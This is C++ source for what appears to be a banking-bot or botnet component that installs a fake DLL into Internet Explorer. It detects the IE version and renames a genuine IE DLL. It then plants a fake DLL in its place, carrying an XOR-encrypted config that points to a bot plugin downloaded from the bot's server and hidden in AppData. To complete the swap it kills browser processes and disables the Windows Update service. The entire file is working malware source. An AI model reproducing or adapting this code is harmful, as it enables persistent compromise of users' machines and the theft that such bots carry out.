
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"

#include "DbgRpt.h"
#include "Utils.h"
#include "getsec.h"

#include "BotSocket.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define FAKEDLLDBG LDRDEBGTEMPLATES::DBGOutMessage<>


// ������� ���������� ����� XOR. 
// ������� ��������, ����� ����������� � FakeDll � ������������� 
// ��� ���� ���������
void XorCrypt(const LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
{
	DWORD a = 0;

	while (a < Size)
	{
		DWORD b = 0;
		while (b < KeySize)
		{
			Buffer[a] ^= (Key[b] + (a * b));
			b++;
		}
		a++;
	}
}

// ��������� ���������� ����� �������� 16 ����
// ������������ ��������� �-��� �������� GUID
// ���������� ��������� GUID
GUID GenerateCryptKey()
{
	GUID key;

	m_memset(&key, 0, sizeof(key));
	pCoCreateGuid(&key);
	return key;
}

// ��������� ���������� ���� � ������������ ����� Bot.plug, 
// ������� ����� �������� � FakeDll
// ����� ���������� �������� � ������ ���������� ��������� ��������� �-���
bool GenerateRandomPlugPath(wstring& Path)
{
	WCHAR PathBuffer[2* MAX_PATH];
	BOOL  DirectoryObtained = FALSE;

	// �������� ���� � "Documents and Settings\username\Application Data"
	m_memset(PathBuffer, 0, sizeof(PathBuffer));
	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_APPDATA, false);
	if (DirectoryObtained == FALSE) return false;

	Path += PathBuffer;
	Path += L"\\";

	// ���������� ���������� ��� �����
	wstring Name; 
	GUID    Uuid = GenerateCryptKey();
	LPBYTE  UuidPtr = (LPBYTE)&Uuid;

	Name.Format(L"%02X%02X%02X%02X%02X%02X.dat", 
		UuidPtr[0], UuidPtr[1], UuidPtr[2], UuidPtr[3], UuidPtr[4], UuidPtr[5]
		);
	
	Path += Name;

	return true;
}

// �-��� ������ ��������� ����� ��� �������
// 
// ���������� ��������� �� ��������� ������ ��� NULL, ���� ����� �� �������
LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, DWORD AnchorSize)
{
	BYTE* Current = (BYTE*)Buffer;
	BYTE* Limit   = Current + BufferSize - AnchorSize;

	while (Current < Limit)
	{
		if (m_memcmp(Current, Anchor, AnchorSize) == 0)
		{
			return Current;
		}
		Current++;
	}
	return NULL;
}

// �-��� ���������� ��������� � ���� FakeDll.
// ���������� ��������� ��������, ���� �� ���������� ��������� � 
// NULL - ���� ��������� ������
LPBYTE CreateFakeDllWithBuiltingSettings(
	const GUID & CryptKey,
	const wstring& DllName,
	const wstring& BotPlugPath,
	const LPVOID DllBody,
	const DWORD  DllSize
	)
{
	const char CryptKeyAnchor[]    = "A6B7D7BE1E374CD";
	const char RealDllNameAnchor[] = "5BC11231-93CF-4815-8B45-7E7579F39561";
	const char BotPlugPathAnchor[] = "4533703D-7B7F-48FE-A3DA-3155AC13EACB";

	struct AnchorDesc
	{
		LPBYTE Anchor;
		DWORD  AnchorSize;
		DWORD  AnchorBufferSize;
		
		LPBYTE Value;
		DWORD  ValueSize;
		bool   EncryptValue;

	} ReplaceByAnchorList[] = 
	{
		{ (LPBYTE)&CryptKeyAnchor, sizeof(CryptKeyAnchor), 
		  16, 
		  (LPBYTE)&CryptKey, 16, false 
		},
		
		{ (LPBYTE)&RealDllNameAnchor, sizeof(RealDllNameAnchor), 
		  MAX_PATH * sizeof(WCHAR), 
		  (LPBYTE)DllName.t_str(), DllName.Length() * sizeof(WCHAR), true 
		},

		{ (LPBYTE)&BotPlugPathAnchor, sizeof(BotPlugPathAnchor), 
		  MAX_PATH * sizeof(WCHAR), 
		  (LPBYTE)BotPlugPath.t_str(), BotPlugPath.Length() * sizeof(WCHAR), true 
		}
	};

	LPVOID NewDllBody = MemAlloc(DllSize);

	m_memcpy(NewDllBody, DllBody, DllSize);

	DWORD ReplacedCount = 0;
	for (DWORD i = 0; i < ARRAYSIZE(ReplaceByAnchorList); i++)
	{
		AnchorDesc& ad = ReplaceByAnchorList[i];
		
		// ���� ������ ������, ��� ������, ����� ��������� ��������
		if (ad.ValueSize > ad.AnchorBufferSize) continue;

		// ���� �����
		LPBYTE AnchorBuffer = LookupAnchor(NewDllBody, DllSize, ad.Anchor, ad.AnchorSize);

		// ���� ����� �� ������ - ����� ��������� ��������
		if (AnchorBuffer == NULL) continue;

		// �������� ��������� �����
		m_memset(AnchorBuffer, 0, ad.AnchorBufferSize);

		// �������� ������ � ������
		m_memcpy(AnchorBuffer, ad.Value, ad.ValueSize);

		// ���� ����� ������� ��������� - ������� ���� ������
		if (ad.EncryptValue) 
		{
			XorCrypt((const LPBYTE)&CryptKey, 16, AnchorBuffer, ad.AnchorBufferSize);
		}

		ReplacedCount++;
	}

	// ���� ���-�� �� ������� ��� �� ��������� - ���������� ������.
	if (ReplacedCount != ARRAYSIZE(ReplaceByAnchorList))
	{
		MemFree(NewDllBody);
		NewDllBody = NULL;
	}

	return (LPBYTE)NewDllBody;
}

// ���������� ������ �������������� IE
// ���������� ������� �� ������� (HKLM\Software\Microsoft\Internet Explorer:Version)
// ���� � ���������� ������������ 0 - ���������� ����������
DWORD GetIeVersion()
{
	HKEY  Key = NULL;
	DWORD status = 0;
	
	status = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Internet Explorer", 
		0, KEY_READ, &Key);
	
	if (status != ERROR_SUCCESS) return 0;

	char  VersionBuffer[100];
	DWORD VersionBufferLength = sizeof(VersionBuffer) - 1;
	DWORD Type = 0;

	m_memset(VersionBuffer, 0, sizeof(VersionBuffer));
	status = (DWORD)pRegQueryValueExA(Key, "Version", NULL, &Type, (LPBYTE)VersionBuffer,
		&VersionBufferLength);

	pRegCloseKey(Key);

	FAKEDLLDBG("GetIeVersion", "VersionBuffer='%s'", VersionBuffer);

	if (status != ERROR_SUCCESS) return 0;
	if (Type != REG_SZ)          return 0;

	if (VersionBuffer[0] == '6') return 6;
	if (VersionBuffer[0] == '7') return 7;
	if (VersionBuffer[0] == '8') return 8;

	return 0;
}


// ������������� ������ ��� �������� ��� ����� ���������� 
// � ������ ����� ���������� �������
wstring CreateRealDllName(const wstring& DllName)
{
	WCHAR chars[] = L"abcdefghiklmnopqrstuvwxyz";
	WCHAR c[] = {chars[(DWORD)pGetTickCount() % ARRAYSIZE(chars)], 0};
	
	wstring result;
	result += c;
	result += DllName;
	
	return result;
}

// � ����������� �� ������ IE :
// 1) �������� ���� ���, � ������� ����� ���������� FakeDll
// 2) �������� ���� ���, ���� ����� ���������� ������������ ���
// 3) ���� ������������� ����������� FakeDllPath � RealDllPath
bool SelectTargetIeDll(
	wstring & FakeDllPath,
	wstring & RealDllPath,
	bool & MoveFakeToRealBeforeFakeSave
	)
{
	const WCHAR * Ie8Files[] = 
	{
		L"sqmapi.dll",
		L"xpshims.dll",
		L"ieproxy.dll"
	};

	const WCHAR * Ie7Files[] = 
	{
		L"custsat.dll",
		L"ieproxy.dll"
	};

	WCHAR PathBuffer[2* MAX_PATH];
	BOOL  DirectoryObtained = FALSE;
	DWORD IeVersion = GetIeVersion();

	// ���� ���������� ���������� ������ IE - ������� ������
	if (IeVersion == 0) return false;
	
	// ���� ����������� ������ ��� ������ 6, 7 � 8
	if (IeVersion < 6) return false;
	if (IeVersion > 8) return false;

	// �������� ���� � Program Files
	m_memset(PathBuffer, 0, sizeof(PathBuffer));
	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_PROGRAM_FILES, false);
	if (DirectoryObtained == FALSE) return false;

	wstring ProgramFilesPath = PathBuffer;

	// �������� ���� � System32
	m_memset(PathBuffer, 0, sizeof(PathBuffer));
	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, PathBuffer, CSIDL_SYSTEM, false);
	if (DirectoryObtained == FALSE) return false;
	wstring System32Path = PathBuffer;

	DWORD   RandNumber = (DWORD)pGetTickCount();
	wstring DllName;
	wstring DllDirectory;

	if (IeVersion == 6) 
	{
		DllDirectory = System32Path + wstring(L"\\macromed\\flash\\");
		DllName = L"flash.ocx";
	}
	
	if (IeVersion == 7) 
	{
		DllDirectory = ProgramFilesPath + wstring(L"\\Internet Explorer\\");
		DllName = Ie7Files[RandNumber % ARRAYSIZE(Ie7Files)];
	}
		
	if (IeVersion == 8) 
	{
		DllDirectory = ProgramFilesPath + wstring(L"\\Internet Explorer\\");
		DllName = Ie8Files[RandNumber % ARRAYSIZE(Ie8Files)];
	}

	MoveFakeToRealBeforeFakeSave = true;

	FakeDllPath = DllDirectory + DllName;
	RealDllPath = DllDirectory + CreateRealDllName(DllName);

	return true;
}

// ���������� ���� FakeDll
// ���� �� ���������� �������� - ���������� NULL
LPVOID GetBuiltinFakeDllBody(DWORD & Size)
{
	//return File::ReadToBufferA("fake.dll", Size);
	return GetSectionData("FakeDllBody", &Size);
}

// ������ ���� Bot.plug � �����.
// �������� ��������, ������ ��� �������� ����� ���������� Bot.plug ����� � ��������.
LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
{
	//return File::ReadToBufferA("bot.plug", Size);

	string PlugName = BotPlugName;
	STR::AnsiLowerCase(PlugName.t_str());

	// ������ ������ ���� � ������� ����������� ��� �������
	LPBYTE Plug = Plugin::DownloadEx(PlugName.t_str(), NULL, &Size, true, false, NULL);
	FAKEDLLDBG("LoadBotPlugBody", "DownloadEx result module=0x%X size=%u", Plug, Size);

	return Plug;
}

// ������� ��� �������� IE (� � ��� � ��� ��������� ��������)
void KillAllIeProcesses()
{
	FAKEDLLDBG("KillAllIeProcesses", "runned");
	KillAllBrowsers();
}

// ��� ������� ����� ��� IE ������ ���������� ������������ ���������
// � ������������� ����������, ������� �������� ���� ��� �� ������������.
// ����� �������� �����, ��� ��������� ���� ��������� ������ ���������� Windows.
void TryDisableAutoUpdateService()
{
	FAKEDLLDBG("DisableAutoUpdateService", "started");

	// ������� �� ������ ������� ���������� �������� � ������� �
	// Disabled
	HKEY  Key = NULL;
	DWORD status = 0;
	
	status = (DWORD)pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\wuauserv",
		0, KEY_WRITE, &Key);
	if (status != ERROR_SUCCESS) return;

	DWORD ServiceStart = SERVICE_DISABLED;
	status = (DWORD)pRegSetValueExA(Key, "Start", 0, REG_DWORD, (const LPBYTE)&ServiceStart, sizeof(ServiceStart));
	
	pRegCloseKey(Key);
	if (status != ERROR_SUCCESS) return;

	// ����� �������� ����������� ������� ������� ���������� ������.
	// ��������� �� ������� ���������� ������ ����� ������������
	SC_HANDLE ScmHandle = NULL;
	SC_HANDLE SvcHandle = NULL;

	do
	{
		ScmHandle = (SC_HANDLE)OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (ScmHandle == NULL) break;

		SvcHandle = (SC_HANDLE)OpenServiceA(ScmHandle, "wuauserv", SERVICE_STOP | SERVICE_QUERY_STATUS);
		if (SvcHandle == NULL) break;

		SERVICE_STATUS_PROCESS ssp;

		BOOL InitStopResult = ControlService(SvcHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
		if (InitStopResult != TRUE) break;

		// 2 ������ �����
		DWORD Timeout   = 2 * 60 * 1000;
		DWORD StartTime = (DWORD)pGetTickCount();
		
		while (ssp.dwCurrentState != SERVICE_STOPPED)
		{
			DWORD SizeRequired = 0;
			pSleep(ssp.dwWaitHint);

			BOOL QueryResult = QueryServiceStatusEx(SvcHandle, SC_STATUS_PROCESS_INFO,
				(LPBYTE)&ssp, sizeof(ssp), &SizeRequired);
			
			if (QueryResult == FALSE) break;
			if (ssp.dwCurrentState == SERVICE_STOPPED) break;
			if (((DWORD)pGetTickCount() - StartTime) > Timeout ) break;
		}
	}
	while(false);

	FAKEDLLDBG("DisableAutoUpdateService", "Finished.");

	if (SvcHandle != NULL) CloseServiceHandle(SvcHandle);
	if (ScmHandle != NULL) CloseServiceHandle(ScmHandle);
}

// �-��� ��������� 
BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodySize)
{
	FAKEDLLDBG("InstallForIe", 
		"Started BotPlugName='%s' InstallerBody=0x%X InstallerBodySize=%u", 
		BotPlugName, SelfBody, SelfBodySize);

	LPBYTE FakeDllWithSettings = NULL;
	BOOL   result = FALSE;

	do
	{
		DWORD  FakeDllSize = 0;
		LPVOID FakeDllBody = GetBuiltinFakeDllBody(FakeDllSize);

		FAKEDLLDBG("InstallForIe", 
			"GetBuiltinFakeBody() dll=0x%X size=%u", FakeDllBody, FakeDllSize);

		// �������� �� ������������ ���� FakeDll
		if (FakeDllBody == NULL) break;

		// Generate crypt key
		GUID CryptKey = GenerateCryptKey();

		// Generate random path for bot.plug (User\AppData)
		wstring BotPlugPath;
		bool PlugPathGenerated = GenerateRandomPlugPath(BotPlugPath);
		FAKEDLLDBG("InstallForIe", 
			"GenerateRandomPlugPath() result=%d path='%S'", PlugPathGenerated, BotPlugPath.t_str());

		// �������� ����� ��� ���������.
		wstring FakeDllPath;
		wstring RealDllPath;
		bool    MoveFakeToRealBeforeFakeSave = false;

		bool DllSelected = SelectTargetIeDll(FakeDllPath, RealDllPath, MoveFakeToRealBeforeFakeSave);
		FAKEDLLDBG("InstallForIe", 
			"SelectTargetIeDll() result=%d FakeDllPath='%S' RealDllPath='%S'", 
			DllSelected, FakeDllPath.t_str(), RealDllPath.t_str());

		if (!DllSelected) break;

		DWORD  PlugSize = 0;
		LPBYTE Plug = (LPBYTE)LoadBotPlugBody(BotPlugName, PlugSize);
		FAKEDLLDBG("InstallForIe", "LoadBotPlugBody result module=0x%X size=%u", Plug, PlugSize);
		
		// �� ������� ������� ������ Bot.plug
		if (Plug == NULL) break;

		XorCrypt((LPBYTE)&CryptKey, sizeof(GUID), Plug, PlugSize);

		// ���������� ���������� ���� ���� � ����
		DWORD PlugWritten = File::WriteBufferW(BotPlugPath.t_str(), Plug, PlugSize);
		FAKEDLLDBG("InstallForIe", "WriteBufferW() to '%S' results: PlugWritten=%u PlugSize=%u", 
			BotPlugPath.t_str(), PlugWritten, PlugSize);

		// ���� �������������� - ������
		if (PlugSize != PlugWritten) break;

		// ���������� � �������� ��� ��� ���������, ����������� ��� ������ 
		// (crypt key, new target dll path, path to crypted botplug) 
		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings(CryptKey, 
			RealDllPath, BotPlugPath, FakeDllBody, FakeDllSize);

		FAKEDLLDBG("InstallForIe", "CreateFakeDllWithBuiltingSettings() result=0x%X", FakeDllWithSettings);

		if (FakeDllWithSettings == NULL) break;

		if (MoveFakeToRealBeforeFakeSave)
		{
			// ������� ������������ ������� DLL��
			// ���� �� ���������� - ������� ������� ��� �������� IE � ������� 
			// ��������������� �����.

			DWORD MaxAttemptsCount = 5;
			DWORD AttemptsCount = 0;

			for (DWORD i = 0; i < MaxAttemptsCount; i++)
			{
				FAKEDLLDBG("InstallForIe", "Try to MoveFile(Src='%S',Dst='%S')", FakeDllPath.t_str(), RealDllPath.t_str());

				BOOL MoveResult = (BOOL)pMoveFileW(FakeDllPath.t_str(), RealDllPath.t_str());
				
				if (MoveResult == TRUE) break;

				KillAllIeProcesses();
				AttemptsCount++;
			}

			FAKEDLLDBG("InstallForIe", "MoveFile results AttemptsCount=%u MaxAttemptsCount=%u",
				AttemptsCount, MaxAttemptsCount);

			if (AttemptsCount == MaxAttemptsCount) break;
		}
		
		// ���� ��������������� ������ ������� - ��������� �����
		DWORD Written = File::WriteBufferW(FakeDllPath.t_str(), FakeDllWithSettings, FakeDllSize);

		FAKEDLLDBG("InstallForIe", "WriteBuffer for target dll.(Written=%u FakeDllSize=%u)",
			Written, FakeDllSize);

		if (Written != FakeDllSize) break;

		// ���� �� ������ ������� - ��������� ������ ���������� Windows
		TryDisableAutoUpdateService();

		result = TRUE;
		// report result
	}
	while (false);

	if (FakeDllWithSettings != NULL) MemFree(FakeDllWithSettings);

	FAKEDLLDBG("InstallForIe", "Finished with result=%d",result);
	return result;
}

// �������������� �-��� ��� ������� ��������� FakeDll
// ���������� �� ���� �� ������� installfakedll
BOOL WINAPI FakeInstall(
	const char* BotPlugName, 
	const char* Target, 
	const void* InstallerBody, 
	DWORD InstallerBodySize)
{
	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	FAKEDLLDBG("FakeInstall", 
		"Started BotPlugName='%s' Target='%s' InstallerBody=0x%X InstallerBodySize=%u", 
		BotPlugName, Target, InstallerBody, InstallerBodySize);

	InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);

	return FALSE;
}

#pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )

DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
{
	FAKEDLLDBG("FakeDllInstallerDllMain", "called with reason=%d", reason);

	return TRUE;
}
